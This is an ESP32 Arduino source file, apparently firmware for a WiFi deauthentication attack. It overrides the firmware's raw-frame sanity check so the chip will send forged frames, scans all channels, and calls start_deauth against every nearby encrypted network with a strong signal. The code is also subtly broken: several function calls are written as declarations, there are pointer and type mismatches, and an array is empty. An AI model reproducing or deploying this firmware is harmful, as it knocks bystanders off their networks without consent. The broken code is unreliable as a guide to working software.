#include <stdint.h>
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0;
}

// Include Statements
// -----------------------------------------
#include <Arduino.h>
#include <WiFi.h>
#include <WiFi.h>
#include <string.h>
#include <stdio.h>
#include <string>
#include <string.h>
#include <freertos/FreeRTOS.h>
#include <freertos/event_groups.h>
#include <esp_wifi.h>
#include <esp_wifi_default.h>
#include <esp_wifi_types.h>
#include <esp_wifi_netif.h>
#include <esp_wifi_crypto_types.h>
#include <esp_log.h>
#include <esp_log_internal.h>
#include <esp_event.h>
#include <esp_sleep.h>
#include <nvs_flash.h>
#include <regex.h>
#include <MacRandomizer.h>
#include "Utils.hpp"
#include "main.hpp"
#include "types.hpp"

MacRandomizer macRandom;

// Global Variables
// -----------------------------------------
RTC_DATA_ATTR int bootCount = 0;
int scan_delay = 10; // Value is in milliseconds(1000ms = 1s) can set to 0 for faster rates
int send_delay = 10; // Value is in milliseconds(1000ms = 1s) can set to 0 for faster rates
int deauthPacketRetransmissions = 40; // Packet retransmission value[~5-10 LOW | ~20-50 MEDIUM | 50+ HIGH | 100+ EXTREME **ONLY USE WITH PROPER COOLING]
int retransmissionSessions = 3; // Number of times to repeat the retransmission of the packets
int num_networks;

// Print Wakeup Reason
// ------------------------------------------
void print_wakeup_reason()
{
  esp_sleep_wakeup_cause_t wakeup_reason;

  wakeup_reason = esp_sleep_get_wakeup_cause();

  switch (wakeup_reason)
  {
  case ESP_SLEEP_WAKEUP_EXT0:
    Serial.println("Wakeup caused by external signal using RTC_IO");
    break;
  case ESP_SLEEP_WAKEUP_EXT1:
    Serial.println("Wakeup caused by external signal using RTC_CNTL");
    break;
  case ESP_SLEEP_WAKEUP_TIMER:
    Serial.println("Wakeup caused by timer");
    break;
  case ESP_SLEEP_WAKEUP_TOUCHPAD:
    Serial.println("Wakeup caused by touchpad");
    break;
  case ESP_SLEEP_WAKEUP_ULP:
    Serial.println("Wakeup caused by ULP program");
    break;
  default:
    Serial.printf("Wakeup was not caused by deep sleep: %d\n", wakeup_reason);
    break;
  }
}

static void print_cipher_type(int pairwise_cipher, int group_cipher)
{
    switch (pairwise_cipher) {
    case WIFI_CIPHER_TYPE_NONE:
        ESP_LOGI(TAG, "Pairwise Cipher \tWIFI_CIPHER_TYPE_NONE");
        break;
    case WIFI_CIPHER_TYPE_WEP40:
        ESP_LOGI(TAG, "Pairwise Cipher \tWIFI_CIPHER_TYPE_WEP40");
        break;
    case WIFI_CIPHER_TYPE_WEP104:
        ESP_LOGI(TAG, "Pairwise Cipher \tWIFI_CIPHER_TYPE_WEP104");
        break;
    case WIFI_CIPHER_TYPE_TKIP:
        ESP_LOGI(TAG, "Pairwise Cipher \tWIFI_CIPHER_TYPE_TKIP");
        break;
    case WIFI_CIPHER_TYPE_CCMP:
        ESP_LOGI(TAG, "Pairwise Cipher \tWIFI_CIPHER_TYPE_CCMP");
        break;
    case WIFI_CIPHER_TYPE_TKIP_CCMP:
        ESP_LOGI(TAG, "Pairwise Cipher \tWIFI_CIPHER_TYPE_TKIP_CCMP");
        break;
    case WIFI_CIPHER_TYPE_AES_CMAC128:
        ESP_LOGI(TAG, "Pairwise Cipher \tWIFI_CIPHER_TYPE_AES_CMAC128");
        break;
    case WIFI_CIPHER_TYPE_SMS4:
        ESP_LOGI(TAG, "Pairwise Cipher \tWIFI_CIPHER_TYPE_SMS4");
        break;
    case WIFI_CIPHER_TYPE_GCMP:
        ESP_LOGI(TAG, "Pairwise Cipher \tWIFI_CIPHER_TYPE_GCMP");
        break;
    case WIFI_CIPHER_TYPE_GCMP256:
        ESP_LOGI(TAG, "Pairwise Cipher \tWIFI_CIPHER_TYPE_GCMP256");
        break;
    default:
        ESP_LOGI(TAG, "Pairwise Cipher \tWIFI_CIPHER_TYPE_UNKNOWN");
        break;
    }

    switch (group_cipher) {
    case WIFI_CIPHER_TYPE_NONE:
        ESP_LOGI(TAG, "Group Cipher \tWIFI_CIPHER_TYPE_NONE");
        break;
    case WIFI_CIPHER_TYPE_WEP40:
        ESP_LOGI(TAG, "Group Cipher \tWIFI_CIPHER_TYPE_WEP40");
        break;
    case WIFI_CIPHER_TYPE_WEP104:
        ESP_LOGI(TAG, "Group Cipher \tWIFI_CIPHER_TYPE_WEP104");
        break;
    case WIFI_CIPHER_TYPE_TKIP:
        ESP_LOGI(TAG, "Group Cipher \tWIFI_CIPHER_TYPE_TKIP");
        break;
    case WIFI_CIPHER_TYPE_CCMP:
        ESP_LOGI(TAG, "Group Cipher \tWIFI_CIPHER_TYPE_CCMP");
        break;
    case WIFI_CIPHER_TYPE_TKIP_CCMP:
        ESP_LOGI(TAG, "Group Cipher \tWIFI_CIPHER_TYPE_TKIP_CCMP");
        break;
    case WIFI_CIPHER_TYPE_SMS4:
        ESP_LOGI(TAG, "Group Cipher \tWIFI_CIPHER_TYPE_SMS4");
        break;
    case WIFI_CIPHER_TYPE_GCMP:
        ESP_LOGI(TAG, "Group Cipher \tWIFI_CIPHER_TYPE_GCMP");
        break;
    case WIFI_CIPHER_TYPE_GCMP256:
        ESP_LOGI(TAG, "Group Cipher \tWIFI_CIPHER_TYPE_GCMP256");
        break;
    default:
        ESP_LOGI(TAG, "Group Cipher \tWIFI_CIPHER_TYPE_UNKNOWN");
        break;
    }
}

int array_size(uint8_t *array) {
  size_t size_charray = sizeof(CHANNEL_LIST) / sizeof(CHANNEL_LIST[0]);
  return size_charray;
}

wifi_ap_record_t combine_arrays(wifi_ap_record_t *array1, size_t size1, wifi_ap_record_t *array2, size_t size2) {
  wifi_ap_record_t combined_array[size1 + size2] = {};
  memcpy(combined_array, array1, size1 * sizeof(wifi_ap_record_t));
  memcpy(combined_array + size1, array2, size2 * sizeof(wifi_ap_record_t));
  return *combined_array;
}

// esp_err_t ICACHE_FLASH_ATTR esp_wifi_scan_get_ap_records(uint16_t *number, wifi_ap_record_t *ap_records) {
//   if (*number <= _ap_records.size()) {
//     *number = _ap_records.size();
//   }
//   size_t i = 0;
//   for (auto &&record : _ap_records) {
//       ap_records[i] = record;
//       ++i;
//       if (i >= *number)
//           break;
//   }
//   return ESP_OK;
// }

void scan_loop() {
  int ii = 0;
  char err = false;
  wifi_ap_record_t ap_records[] = {};
  uint16_t num_networks = 0;
  while (true) {
    size_t size_charray = sizeof(CHANNEL_LIST) / sizeof(CHANNEL_LIST[0]);

    while (ii < SCAN_ROUNDS)
    {
      int i;

      for (int i = 0; i < size_charray; i++)
      {
        uint8_t wifi_channel = CHANNEL_LIST[i];
        Serial.printf("Set channel to %d.\n", i);
        wifi_scan_config_t wifi_scan_config = {
          .ssid = NULL,
          .bssid = NULL,
          .channel = wifi_channel,
          .show_hidden = true,
          .scan_type = WIFI_SCAN_TYPE_ACTIVE
        };
        esp_wifi_scan_start(&wifi_scan_config, true);
        // https://github.com/jPerotto/easyMesh/blob/86fc3e6ade125eecc3f17547e51cf608ab99929b/src/espInterface.cpp
        esp_err_t esp_wifi_scan_get_ap_records(uint16_t *number, wifi_ap_record_t *ap_records);
        wifi_ap_record_t *records = (wifi_ap_record_t*)malloc(num_networks*sizeof(wifi_ap_record_t));
        err = esp_wifi_scan_get_ap_records(&num_networks, records);
        Serial.println("Networks found: " + num_networks);
        Serial.println("With errors: " + err);

        if (num_networks > 0)
        {
          Serial.println("Networks found: " + String(num_networks));
          wifi_ap_record_t *scan_result = combine_arrays(ap_records, num_networks, records, num_networks);

          delay(scan_delay);
        } else {
          Serial.println("No networks found");
          delay(scan_delay);
        };
      };
    };
    
    // if network signal is greater than -75, deauth
    for (int i = 0; i < num_networks; i++)
    {
      if (WiFi.encryptionType(i) != WIFI_AUTH_OPEN && WiFi.encryptionType(i) != WIFI_AUTH_WEP && WiFi.RSSI(i) >= -75)
      {
        start_deauth(i, DEAUTH_REASON);
        Serial.println("Deauth attack completed");
        stop_deauth();
        delay(send_delay);
      };

    };

    delay(scan_delay);
    ii++;
    };
    
  // Sleep to conserve power
  Serial.println("Going to sleep now");
  esp_sleep_enable_timer_wakeup(uS_TO_S_FACTOR * TIME_TO_SLEEP);
  Serial.println("Setup ESP32 to sleep for every " + String(TIME_TO_SLEEP) +
                " Seconds");
  delay(1000);
  Serial.flush();
  bool esp_deep_sleep_try();
};

// Configure the Network
// ------------------------------------------
void main_app() {
  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, LOW);   // Turn off LED
  Serial.begin(115200);
  delay(1000);

  ++bootCount;
  Serial.println("Boot number: " + String(bootCount));

  print_wakeup_reason();

  // Initialize WiFi in STA(station) mode
  esp_wifi_stop();
  esp_wifi_set_mode(WIFI_MODE_STA);

  Serial.println("Station Mode Initialized");
  // Set configuration values
  wifi_country_t config = {
    .cc = "US",
    .schan = 1,
    .nchan = CHANNEL_MAX,
    .policy = WIFI_COUNTRY_POLICY_MANUAL,
  };
  int8_t esp_wifi_set_max_tx_power(80);
  Serial.println("Setting Country Code to: " + String(config.cc));
  
  wifi_country_t esp_wifi_set_country(config);

  // Enable promiscuous mode
  bool esp_wifi_set_promiscuous(true);
  esp_wifi_set_protocol(WIFI_IF_STA, WIFI_PROTOCOL_11B);
  Serial.println("Promiscuous Mode Enabled");

  // Start Deauth Attack
  Serial.println("Starting Deauth Attack");

  void scan_loop();
};
